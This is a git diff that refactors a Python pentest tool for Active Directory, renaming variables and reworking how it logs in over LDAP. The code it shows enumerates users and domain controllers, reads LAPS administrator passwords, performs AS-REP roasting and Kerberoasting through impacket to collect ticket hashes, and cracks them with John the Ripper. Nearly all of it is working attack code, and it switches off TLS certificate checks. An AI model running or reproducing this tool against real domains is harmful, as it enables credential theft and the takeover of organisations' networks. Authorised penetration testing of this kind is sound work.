@@ -23,6 +23,13 @@ class bcolors:
     FAIL = '\033[91m'
     ENDC = '\033[0m'
     BOLD = '\033[1m'
+
+class LoginError:
+    NO_ERROR            = 0
+    INVALID_CREDENTIALS = 1
+    SERVER_DOWN         = 2
+    OTHER_ERROR         = 3
+
 def highlightGreen(msg:str)->str:
     return bcolors.OKGREEN + msg + bcolors.ENDC
 def highlightRed(msg:str)->str:
@@ -37,15 +44,15 @@ def LdapPathColor(data:str)->str:
 def printTitle(msg:str)->None:
     print("\n" + bcolors.BOLD + msg + bcolors.ENDC)
 
-def CreateSpace(varString:str,nbSpace = 25)->str:
-    return (nbSpace - int(math.fmod(len(varString),nbSpace))) * ' '
+def CreateSpace(var_string:str,nbSpace = 25)->str:
+    return (nbSpace - int(math.fmod(len(var_string),nbSpace))) * ' '
 
-def ResolveIpAddress(ServerName:str)->str:
+def ResolveIpAddress(domain_name:str)->str:
     try:
-        data = socket.gethostbyname_ex(ServerName)
+        data = socket.gethostbyname_ex(domain_name)
         ipAddres = data[2][0]
     except Exception:
-        log.warning("Fail to resolve ServerName: " +ServerName)
+        log.warning("Fail to resolve ServerName: " +domain_name)
         return None
     return ipAddres
 
@@ -118,31 +125,8 @@ class LdapEnum:
             log.failure("LDAPError: " + str(error))
             exit(0)
         return resultSearch
-        
-    def ConnectServerLdap(self,ServerName:str,ipAddress:str, username:str, password:str, isSSL:bool)->None:
-        log.info("Domain name: "+ServerName)
-        if(username == None):
-            log.info("Username:    "+StyleBold("Anonymous"))
-        else:
-            log.info("Username:    "+username)
-        if(ipAddress == None):
-            ipAddress = ResolveIpAddress(ServerName)
-            if(ipAddress == None):
-                log.failure("Unable to resolve domain name:  "+ServerName+ " !\n")
-                exit(0)
 
-        log.info("IP Address:  "+ipAddress)
-        if(isSSL):
-            ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
-            connect = ldap.initialize('ldaps://' + ipAddress)
-            log.info("SSL connect: "+highlightGreen("TRUE"))
-        else:
-            connect = ldap.initialize('ldap://' + ipAddress)
-            log.info("SSL connect: "+highlightRed("FALSE"))
-        print()
-
-        connect.protocol_version = self.ldapVersion
-        connect.set_option(ldap.OPT_REFERRALS, 0)
+    def LoginLdap(self,connect, username:str, password:str , first_time:bool)->int:
         try:
             if(username == None and password == None):
                 connect.simple_bind_s('', '')
@@ -151,18 +135,52 @@ class LdapEnum:
                     password == ''
                 connect.simple_bind_s(username, password)            
         except ldap.INVALID_CREDENTIALS:
-            log.failure('Invalid credentials !\n')
-            exit(0)
+            if(not first_time):
+                log.failure('Invalid credentials !\n')
+            return LoginError.INVALID_CREDENTIALS
         except ldap.SERVER_DOWN:
-            log.failure("Server is down !\n\n") 
-            exit(0)
+            log.failure("Server is down !\n\n")
+            return LoginError.SERVER_DOWN
+            #exit(0)
         except ldap.LDAPError as error:
             if type(error.message) == dict and error.message.has_key('desc'):
                 log.failure("Other LDAP error: " + error.message['desc']+ " !\n")
             else: 
                 log.failure("Other LDAP error: " + error+ " !\n")
                 self.ldapCon = None
-            exit(0)
+            return LoginError.OTHER
+        return LoginError.NO_ERROR
+
+    def ConnectServerLdap(self,domain_name:str,ip_address:str, username:str, password:str, is_SSL:bool)->None:
+        log.info("Domain name: "+domain_name)
+        if(username == None):
+            log.info("Username:    "+StyleBold("Anonymous"))
+        else:
+            log.info("Username:    "+username)
+        if(ip_address == None):
+            ip_address = ResolveIpAddress(domain_name)
+            if(ip_address == None):
+                log.failure("Unable to resolve domain name:  "+domain_name+ " !\n")
+                exit(0)
+
+        log.info("IP Address:  "+ip_address)
+        if(is_SSL):
+            ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
+            connect = ldap.initialize('ldaps://' + ip_address)
+            connect.start_tls_s()
+            log.info("SSL connect: "+highlightGreen("TRUE"))
+        else:
+            connect = ldap.initialize('ldap://' + ip_address)
+            log.info("SSL connect: "+highlightRed("FALSE"))
+        print()
+
+        connect.protocol_version = self.ldapVersion
+        connect.set_option(ldap.OPT_REFERRALS, 0)
+        
+        if(self.LoginLdap(connect, username, password,True) == LoginError.INVALID_CREDENTIALS):
+            if(self.LoginLdap(connect, username+'@'+domain_name, password,False) != LoginError.NO_ERROR):
+                exit(0)
+
         log.success("Succesfully Authenticated With LDAP")
         self.ldapCon = connect
         return
@@ -170,9 +188,9 @@ class LdapEnum:
     def UserOldPassword(self)->None:
         printTitle("[-] Users with old password")
 
-        passwordMinAge=100
-        timeFilter = "(pwdLastSet<=%s)"% self.__datetime_to_mstimestamp(datetime.datetime.now() - datetime.timedelta(days=passwordMinAge))
-        OBJECT_TO_SEARCH = '(&(objectCategory=user)'+timeFilter+')'
+        password_min_age=100
+        time_filter = "(pwdLastSet<=%s)"% self.__datetime_to_mstimestamp(datetime.datetime.now() - datetime.timedelta(days=password_min_age))
+        OBJECT_TO_SEARCH = '(&(objectCategory=user)'+time_filter+')'
         ATTRIBUTES_TO_SEARCH = ['pwdLastSet','sAMAccountName']
         
         result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
@@ -205,9 +223,9 @@ class LdapEnum:
 
         result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
         for info in result:
-            baseName = info[0]
+            base_name = info[0]
             username = info[1]
-            log.info("Username: "+highlightRed(username)+CreateSpace(username)+LdapPathColor(baseName))
+            log.info("Username: "+highlightRed(username)+CreateSpace(username)+LdapPathColor(base_name))
 
     def GetDomainControllers(self)->None:
         printTitle("[-] Domain Controllers")
@@ -283,7 +301,7 @@ class LdapEnum:
             computer_name = info[1]['sAMAccountName'][0].decode()
             admin_passwd = info[1]['ms-Mcs-AdmPwd'][0].decode()
             log.info("Computer: " + highlightRed(computer_name) + CreateSpace(computer_name) + 'Password: '+highlightRed(admin_passwd))
-    def disconnect(self)->None:
+    def Disconnect(self)->None:
         self.ldapCon.unbind() 
 
     def StartEnum(self)->None:
@@ -302,7 +320,7 @@ class KerbExploit:
     
     def __init__(self,ldapEnum, domainName,johnPath,wordlistPath,ipAddress=None)->None:
         self.ldapEnum = ldapEnum
-        self.domainName = domainName
+        self.domain_name = domainName
         self.wordlistPath = wordlistPath
         self.ipAddress = ipAddress
         self.johnPath = johnPath
@@ -360,35 +378,35 @@ class KerbExploit:
                     log.success("Credential Found: '" + highlightGreen(data[0])+"' for '"+ highlightGreen(data[1])+"'")
         progress.success(status='Done')
         return isSuccess
-    def __ExploitASREP(self, username:str, outputFile:str)-> bool:
+    def __ExploitASREP(self, username:str, output_file:str)-> bool:
         isSuccess = False
-        argProcess = [GetNPUsers,self.domainName+"/"+username,"-no-pass"]
+        argProcess = [GetNPUsers,self.domain_name+"/"+username,"-no-pass"]
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
             if(len(kerbHash) > 1 and kerbHash[1] == "krb5asrep" and kerbHash[2] == "23"): 
-                if(append_to_file(outputFile,line)):
+                if(append_to_file(output_file,line)):
                     isSuccess = True
         return isSuccess
-    def __ExploitKerberoasting(self, targetUser:str, username:str, password:str, TargetService:str, outputFile:str) -> bool:
-        isSuccess = False
+    def __ExploitKerberoasting(self, targetUser:str, username:str, password:str, TargetService:str, output_file:str) -> bool:
+        is_success = False
         if(username == None or password == None):
-            argProcess = [GetUserSPNs,self.domainName+"/","-request-user",TargetService,"-no-pass"]
+            argProcess = [GetUserSPNs,self.domain_name+"/","-request-user",TargetService,"-no-pass"]
         else:
             new_username = self.__strip_Domain_name(username)
-            argProcess = [GetUserSPNs,self.domainName+"/"+new_username+':'+password,"-request-user",TargetService]
+            argProcess = [GetUserSPNs,self.domain_name+"/"+new_username+':'+password,"-request-user",TargetService]
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
             if(len(kerbHash) > 1 and kerbHash[1] == "krb5tgs" and kerbHash[2] == "23"):
-                if(append_to_file(outputFile,line)):
-                    isSuccess = True
-        return isSuccess
+                if(append_to_file(output_file,line)):
+                    is_success = True
+        return is_success
 
-    def ASREP_Roastable_LDAP(self, outputFile:str = "ASREPHash.hash")-> bool:
+    def ASREP_Roastable_LDAP(self, output_file:str = "ASREPHash.hash")-> bool:
         printTitle("[-] AS-REP Roastable Users")
 
-        isSuccess = False
+        is_success = False
         OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
         result = self.ldapEnum.SearchServerLdapUser(OBJECT_TO_SEARCH)
 
@@ -396,63 +414,63 @@ class KerbExploit:
             baseName = info[0]
             username = info[1]
             log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
-            isSuccess = self.__ExploitASREP(username, outputFile)
-        if(isSuccess):
-            log.success("Hash added to file:                " + outputFile)
-        return isSuccess
-    def ASREP_Roastable_SMB(self, outputFile:str = "ASREPHash.hash")-> bool:
-        isSuccess = False
+            is_success = self.__ExploitASREP(username, output_file)
+        if(is_success):
+            log.success("Hash added to file:                " + output_file)
+        return is_success
+    def ASREP_Roastable_SMB(self, output_file:str = "ASREPHash.hash")-> bool:
+        is_success = False
 
-        argProcess = [GetNPUsers,self.domainName+"/","-outputfile" , outputFile, "-format", "john"]
-        outputTab = self.__RunImpacket(argProcess)
-        for output in outputTab:
+        arg_process = [GetNPUsers,self.domain_name+"/","-outputfile" , output_file, "-format", "john"]
+        output_tab = self.__RunImpacket(arg_process)
+        for output in output_tab:
             if(output != '' and "Copyright" not in output):
                 log.success(f"{output}")
-                isSuccess = True
-        return isSuccess
+                is_success = True
+        return is_success
 
-    def Kerberoastable(self,username:str, password:str, outputFile = "kerbHash.hash") -> dict:
+    def Kerberoastable(self,username:str, password:str, output_file = "kerbHash.hash") -> dict:
         printTitle("[-] Kerberoastable Users")
 
-        isSuccess = False
+        is_success = False
         OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
         
         result = self.ldapEnum.SearchServerLdapUser(OBJECT_TO_SEARCH)
         
         for info in result:
-            baseName = info[0]
-            targetUsername = info[1]
-            log.info("Username: " + highlightRed(targetUsername) + CreateSpace(targetUsername) + LdapPathColor(baseName))
-            isSuccess = self.__ExploitKerberoasting(targetUsername,username, password,targetUsername, outputFile)
-        if(isSuccess):
-            log.success("Hash added to file:                " + outputFile)
-        return isSuccess
-    def DefaultConfig(self, ouputFile:str, formatHash:str) -> dict:
+            base_name = info[0]
+            target_username = info[1]
+            log.info("Username: " + highlightRed(target_username) + CreateSpace(target_username) + LdapPathColor(base_name))
+            is_success = self.__ExploitKerberoasting(target_username,username, password,target_username, output_file)
+        if(is_success):
+            log.success("Hash added to file:                " + output_file)
+        return is_success
+    def DefaultConfig(self, ouput_file:str, format_hash:str) -> dict:
         configDefault = {
-            'ouputFile' : ouputFile,
-            'formatHash' : formatHash,
+            'ouputFile' : ouput_file,
+            'formatHash' : format_hash,
             'isHashFound' : False
         }
         return configDefault
-    def StartKerbExploit(self,userConfig: dict) -> None:
+    def StartKerbExploit(self,user_config: dict) -> None:
         self.__BannerAttack()
 
-        configASREP = self.DefaultConfig('ASREPHash.hash','--format=krb5asrep')
-        configFileKerb = self.DefaultConfig('kerbHash.hash','--format=krb5tgs')
+        config_ASREP = self.DefaultConfig('ASREPHash.hash','--format=krb5asrep')
+        config_file_kerb = self.DefaultConfig('kerbHash.hash','--format=krb5tgs')
 
-        configASREP['isHashFound'] = self.ASREP_Roastable_LDAP(configASREP['ouputFile'])
-        if(userConfig['NPUsersCheck']):
-            configASREP['isHashFound'] = self.ASREP_Roastable_SMB()
+        config_ASREP['isHashFound'] = self.ASREP_Roastable_LDAP(config_ASREP['ouputFile'])
+        if(user_config['NPUsersCheck']):
+            config_ASREP['isHashFound'] = self.ASREP_Roastable_SMB()
         
-        configFileKerb['isHashFound'] = self.Kerberoastable(userConfig['username'], userConfig['password'],configFileKerb['ouputFile'])
+        config_file_kerb['isHashFound'] = self.Kerberoastable(user_config['username'], user_config['password'],config_file_kerb['ouputFile'])
 
 
-        if((configASREP['isHashFound'] or configFileKerb['isHashFound']) and userConfig['baseDN']):
+        if((config_ASREP['isHashFound'] or config_file_kerb['isHashFound']) and user_config['baseDN']):
             printTitle("[-] Starting to crack hashs")
-            if(configASREP['isHashFound'] and userConfig['isCrackingEnable']):
-                self.RunJohn(configASREP['ouputFile'], configASREP['formatHash'])
-            if(configFileKerb['isHashFound'] and userConfig['isCrackingEnable']):
-                self.RunJohn(configFileKerb['ouputFile'], configFileKerb['formatHash'])
+            if(config_ASREP['isHashFound'] and user_config['isCrackingEnable']):
+                self.RunJohn(config_ASREP['ouputFile'], config_ASREP['formatHash'])
+            if(config_file_kerb['isHashFound'] and user_config['isCrackingEnable']):
+                self.RunJohn(config_file_kerb['ouputFile'], config_file_kerb['formatHash'])
 
 def ManageArg() -> dict:
     parser = argparse.ArgumentParser(description='Pentest tool that detect misconfig in AD with LDAP', usage='%(prog)s -d [domain] -u [username] -p [password]')
@@ -476,16 +494,16 @@ def ManageArg() -> dict:
     except:
         exit(0)
         
-    domainCut = args.d.split('.')
-    if(len(domainCut) >= 2):
+    domain_cut = args.d.split('.')
+    if(len(domain_cut) >= 2):
         BASE_DN = ''
-        for dc in domainCut:
+        for dc in domain_cut:
             BASE_DN += 'dc=' + dc + ','
         BASE_DN = BASE_DN[:-1]
     else:
         log.warning("The domain name '"+ args.d +"' is invalid !")
         exit(0)
-    userConfig = {
+    user_config = {
             'domain' : args.d,
             'ipAddress' : args.ip,
             'username' : args.u,
@@ -497,16 +515,16 @@ def ManageArg() -> dict:
             'johnPath' : args.jp,
             'NPUsersCheck' : args.NPUsersCheck
     }
-    return userConfig
+    return user_config
 
-def CheckRequirement(userConfig: dict)-> None:
-    if(userConfig['isCrackingEnable']):
-        if(not path.exists(userConfig['wordlistPath'])):
-            log.warning("Wordlist '"+userConfig['wordlistPath']+"' not found !")
+def CheckRequirement(user_config: dict)-> None:
+    if(user_config['isCrackingEnable']):
+        if(not path.exists(user_config['wordlistPath'])):
+            log.warning("Wordlist '"+user_config['wordlistPath']+"' not found !")
             exit(1)
-        johnPath = which(userConfig['johnPath'])
+        johnPath = which(user_config['johnPath'])
         if(johnPath is None or not path.exists(johnPath)):
-            log.warning("The command  '"+userConfig['johnPath']+"' not found !")
+            log.warning("The command  '"+user_config['johnPath']+"' not found !")
             log.info("Link: https://github.com/openwall/john")
             exit(1)
     GetNPUsersPath = which('GetNPUsers.py')
@@ -534,21 +552,21 @@ def MainBanner() -> None:
     print("  ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝")
     print("\n")
 
-def mainWork(userConfig:dict)-> None:
-    ldapEnum = LdapEnum(userConfig['baseDN'])
-    ldapEnum.ConnectServerLdap(userConfig['domain'], userConfig['ipAddress'],userConfig['username'], userConfig['password'], userConfig['isSSL'])
+def MainWork(user_config:dict)-> None:
+    ldap_enum = LdapEnum(user_config['baseDN'])
+    ldap_enum.ConnectServerLdap(user_config['domain'], user_config['ipAddress'],user_config['username'], user_config['password'], user_config['isSSL'])
 
-    ldapEnum.StartEnum()
+    ldap_enum.StartEnum()
 
-    kerbExploit = KerbExploit(ldapEnum,userConfig['domain'],userConfig['johnPath'],userConfig['wordlistPath'],userConfig['ipAddress'])
-    kerbExploit.StartKerbExploit(userConfig)
+    kerbExploit = KerbExploit(ldap_enum,user_config['domain'],user_config['johnPath'],user_config['wordlistPath'],user_config['ipAddress'])
+    kerbExploit.StartKerbExploit(user_config)
 
-    ldapEnum.disconnect()
+    ldap_enum.Disconnect()
 
 if __name__ == '__main__':
     MainBanner()
-    userConfig = ManageArg()
-    CheckRequirement(userConfig)
-    mainWork(userConfig)
+    user_config = ManageArg()
+    CheckRequirement(user_config)
+    MainWork(user_config)
     print("")
     exit(0)
